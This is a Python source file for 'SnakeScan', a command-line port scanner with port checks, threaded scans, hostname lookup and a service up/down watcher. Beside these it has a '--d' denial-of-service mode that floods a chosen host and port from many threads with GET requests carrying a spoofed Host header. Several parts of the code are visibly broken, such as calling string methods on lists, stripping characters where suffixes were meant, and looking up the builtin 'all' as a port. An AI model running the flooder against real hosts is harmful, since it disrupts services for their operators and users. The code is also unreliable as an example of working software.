"""Module SnakeScan using to scan port or ports in you device or other devices"""
__version__="1.4.6"
import socket
from art import tprint
from datetime import datetime
from tqdm import tqdm
from termcolor import colored
from threading import Thread, Timer

next = None

class Watcher():
        def __init__(self,host,port_user,sleep=0.5):
            self.host=host
            self.port_user=port_user
            self.sleep=sleep
            global next
            Timer(sleep, Watcher,kwargs={"host":host,"port_user":port_user}).start()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            connection = sock.connect_ex((host,port_user))
            if next != connection:
                if connection == 0:
                    print (f"Service is up {host}-->|{port_user}|")
                else:
                    print (f"Service is down {host}-->|{port_user}|")
                next = connection
def run():
    portsopen=0
    portsclosed=0
    Run_now=True
    Bool=True
    boolsd=True
    global num
    num=0
    boolean=0
    OpenPorts=[]
    ports = {
        20: "FTP-DATA", 21: "FTP", 22: "SSH", 23: "Telnet",
        25: "SMTP", 43: "WHOIS", 53: "DNS", 67:"DHCP", 68:"DHCP", 69:"TFTP", 80: "http", 110:"POP3",
        115: "SFTP", 123: "NTP", 139:"NetBios", 143: "IMAP", 161: "SNMP",
        179: "BGP", 443: "HTTPS", 445: "MICROSOFT-DS", 465:"SSL/TLS",
        514: "SYSLOG", 515: "PRINTER", 554:"RTSP", 587:"TLS/STARTTLS", 993: "IMAPS",
        995: "POP3S", 1080: "SOCKS", 1194: "OpenVPN",
        1433: "SQL Server", 1723: "PPTP", 2222:"SSH", 3128: "HTTP",
        3268: "LDAP", 3306: "MySQL", 3389: "RDP",
        5432: "PostgreSQL", 5900: "VNC", 8080: "Tomcat", 10000: "Webmin" }
    def is_port_open(host,port):
    	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    	try:
    		#Connecting...
    		s.connect((host,port))
    		#Port//(Closed<--or-->Open)
    	except:
    		s.close()
    		return False
    	else:
    		s.close()
    		return True
    def dos_threads(host,port,fake_ip):
    	        host=host.strip("--d")
    	        host=host.strip()
    	        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    	        try:
    	            s.connect((host,port))
    	            s.sendto(("GET /"+host+"HTTP/1.1\r\n").encode("ascii"),(host,port))
    	            s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode("ascii"),(host,port))
    	            s.close()
    	            return True
    	        except:
    	           s.close()
    	           return False
    def is_port_open_threads(host,port):
    	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    	try:
    		#Connecting...
    		s.connect((host,port))
    		#Port//(Closed<--or-->Open)
    	except:
    		s.close()
    		try:
    		    print(f"Closed{colored('|X|','red')}-->{ports[all]}|{all}|")
    		except:
    		    print(f"Closed{colored('|X|','red')}-->|{all}|")
    		finally:
    		    s.close()
    	else:
    		print(f"Open{colored('|√|','green')}-->{ports[all]}|{all}|")
    print("–"*60)
    tprint("SnakeScan")
    print("–"*60)
    while Run_now:
    	host=input(f"{colored('[$]','green')}Host-->")
    	if "--v" in host:
    	    print(f"Build_{__version__}")
    	    continue
    	if "--h" in host:
    	    host=host.strip("--h")
    	    host=host.strip()
    	    if host == "port":
    	        print("Port:|--s port,--t|")
    	    if host:
    	        pass
    	    else:
    	        print("Host:|--l,host --i,host --d|")
    	    continue
    	if "--i" in host:
    	    host=host.strip("--i").strip()
    	    print("".center(60,"-"))
    	    try:
    	        hostname=socket.gethostbyaddr(host)
    	        print(f"Host:{hostname[0]}")
    	    except:
    	        hostname="Undefined"
    	        print(f"Host:{hostname}")
    	    try:
    	        print(f"IP:{socket.gethostbyname(host)}")
    	    except Exception as e:
    	        print(f"IP:{e}")
    	        continue
    	    finally:
    	        print("".center(60,"-"))
    	    continue
    	if "http://" in host and "--d" in host:
    	    host=host.strip().strip("--d")
    	    host=host.split("http:")
    	    host=host.strip("//")
    	    host=host+""+"--d"
    	    for i in range(len(host)):
    	        if host[i] == "/":
    	           host=host[0:i]
    	if "https://" in host and "--d" in host:
    	    host=host.strip().strip("--d")
    	    host=host.strip("https:")
    	    host=host.strip("//")
    	    host=host+""+"--d"
    	    for i in range(len(host)):
    	        if host[i] == "/":
    	           host=host[0:i]
    	if "http://" in host:
    	    host=host.strip()
    	    host=host.split("http:")
    	    host=host.strip("//")
    	    for i in range(len(host)):
    	        if host[i] == "/":
    	           host=host[0:i]
    	if "https://" in host:
    	    host=host.strip()
    	    host=host.strip("https:")
    	    host=host.strip("//")
    	    for i in range(len(host)):
    	        if host[i] == "/":
    	           host=host[0:i]
    	if "--d" in host:
    	    try:
    	        host=host.strip("--d")
    	        host=host.strip()
    	        host=socket.gethostbyname(host)
    	        host=host+""+"--d"
    	    except:
    	        print(f"{host} is not avaible")
    	        continue
    	if "--d" in host:
    			           try:
    			               threadsnum=int(input(f"{colored('[$]','green')}Threads-->"))
    			               dos_port=int(input(f"{colored('[$]','green')}Port-->"))
    			               fake_ip=input(f"{colored('[$]','green')}Fake_ip-->")
    			           except:
    			                       while True:
    			                           print(f"{colored('|Threads|Port|','green')}{colored('[X]:Invalid value','red')}")
    			                   			                    
    			                           try:
    			                               threadsnum=int(input(f"{colored('[$]','green')}Threads-->"))
    			                               dos_port=int(input(f"{colored('[$]','green')}Port-->"))
    			                               fake_ip=input(f"{colored('[$]','green')}Fake_ip-->")
    			                            
    			                           except Exception as error:
    			                               print(f"Error:{error}")			                 
    			                               continue
    			                           if threadsnum:
    			                               break
    			           for dos in range(0,threadsnum):
    			               num+=1
    			               t=Thread(target=dos_threads,kwargs={"host":host,"port":dos_port,"fake_ip":fake_ip})
    			               t.start()
    			               t.join()
    			           if dos_threads(host,dos_port,fake_ip):
    			               print("Dos-Information".center(60,"-"))
    			               print(f"{colored('[$]','green')}Threads--> {num} GET/HTTP/1.1")
    			               
    			           else:
    			               try:
    			                   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    			                   host=host.strip("--d")
    			                   host=socket.gethostbyname(host)
    			                   s.connect((host,dos_port))
    			               except Exception as error:
    			                   print(f"Error:{error}")			                   			               
    			           continue	               			               
    	if host == "Exit"  or host == "exit":
    		break
    	if host == "":
    	    while True:
    	        print(f"{colored('Host','green')}{colored('[X]:Empty value','red')}")
    	        host=input(f"{colored('[$]','green')}Host-->")
    	        if host:
    	            break
    	if "--l" in host:
    	   local=""
    	   s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    	   try:
    	       s.connect(('10.255.255.255',1))
    	       local=s.getsockname()[0]
    	   except Exception as e:
    	       local=f"127.0.0.1:{e}"
    	   finally:
    	       s.close()
    	       print(local)
    	       continue		
    	port_user=input(f"{colored('[$]','green')}Port-->")
    	if port_user == "":
    	    while True:
    	        print(f"{colored('Port','green')}{colored('[X]:Empty value','red')}")
    	        port_user=input(f"{colored('[$]','green')}Port-->")
    	        if port_user:
    	            break
    	port_single=port_user
    	if port_user == "Exit" or port_user == "Exit":
    		break
    	if port_user:
    		try:
    			length=int(port_user)
    		except:
    			   if "--t" in str(port_user):
    			           print(f"Thread".center(60,"-"))
    			           for all in ports.keys():
    			               t=Thread(target=is_port_open_threads,kwargs={"host":host,"port":all})
    			               t.start()
    			               t.join()
    			   if "--s" in str(port_user):
    			       port_user=port_single.strip("--s")
    			       port_user=port_user.split()
    			       port_list=port_user
    			       port_user=[]
    			       for i in range(len(port_list)):
    			                   try:
    			                       port_user.append(int(port_list[i]))
    			                   except:
    			                       print(f"{port_list[i]}-->Invalid value")
    			                       break
    			       for port in range(len(port_user)):
    			           if is_port_open(host,port_user[port]):
    			               print(f"Open{colored('|√|','green')}{host}-->{ports[port_user[port]]}|{port_user[port]}|")
    			           else:
    			               try:
    			                   print(f"Closed{colored('|X|','red')}{host}-->{ports[port_user[port]]}|{port_user[port]}|")
    			               except:
    			                    print(f"Closed{colored('|X|','red')}{host}-->|{port_user[port]}|")
    			  			               
    			       continue
    			       
    			   else:
    			      if "--t" in port_user:
    			          t.join()
    			          continue
    			      port_user="100"
    			      print(f"{colored('[!]','red')}Port:invalid value")
    			      for i in range(0,len(port_user)):
    			          if port_user[i] == " ":
    			              port_user=100
    			              break
    			      port_user=int(port_user)
    			      length=port_user
    	else:
    		print(f"{colored('|*|','blue')}100")
    		port_user=100
    		length=port_user
    	print(f"{colored('|!|','red')}Listening {host} please wait...")
    #|-----------------Starting---------------------|
    	length=int(length)+1
    	for port in tqdm(range(1,length)):
    						if is_port_open(host,port):
    							for name in ports:
    									if port == name:
    										OpenPorts=[port]
    										portsopen+=1
    						else:
    							portsclosed+=1
    						if port_user  != "":
    										if int(port_user) == port:
    											if port_user == "":
    												pass
    											elif int(port_user) == port:
    												if is_port_open(host,port):
    													Bool=True
    													boolean+=1
    										else:
    											Bool=False												
    	if boolean == 1:
    		pass
    	for i in OpenPorts:
    		print(f"Open{colored('|√|','green')}-->{ports[i]}|{i}|")
    	print(f"{host}".center(60,"-"))
    	print(f"Closed{colored('|X|','red')}:{portsclosed}")
    	portsclosed=0
    	print(f"Open{colored('|√|','green')}:{portsopen}")
    	portsopen=0
    	print("-"*60) 